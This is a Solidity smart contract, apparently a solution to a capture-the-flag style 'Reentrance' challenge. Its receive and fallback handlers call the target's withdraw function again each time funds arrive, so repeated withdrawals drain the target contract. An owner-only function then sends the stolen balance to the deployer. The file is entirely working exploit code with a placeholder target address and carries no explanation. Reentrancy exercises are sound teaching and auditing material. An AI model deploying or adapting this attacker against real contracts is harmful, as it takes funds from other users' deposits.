// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IReentrance {
    function donate(address _to) external payable;
    function balanceOf(address _who) external view returns (uint256 balance);
    function withdraw(uint256 _amount) external;
}

contract ReentranceAttacker {
    address constant target_address = 0x0000000000000000000000000000000000000000;
    IReentrance target = IReentrance(target_address);
    uint256 constant AMOUNT_TO_WITHDRAW = 1e15; // 0.001 ETH
    address immutable owner;

    constructor() {
        owner = msg.sender;
    }

    modifier onlyOwner {
        require(owner == msg.sender, "Not the owner");
        _;
    }

    fallback() external payable {
        target.withdraw(AMOUNT_TO_WITHDRAW);
    }

    receive() external payable {
        target.withdraw(AMOUNT_TO_WITHDRAW);
    }

    function attack() external payable {
        target.donate{value: msg.value}(address(this));
        target.withdraw(AMOUNT_TO_WITHDRAW);
    }

    function withdraw() external onlyOwner {
        (bool success,) = msg.sender.call{value: address(this).balance}("");
        require(success, "Withdraw failed");
    }

    function checkBalance(address _who) external view returns (uint256) {
        return target.balanceOf(_who);
    }
}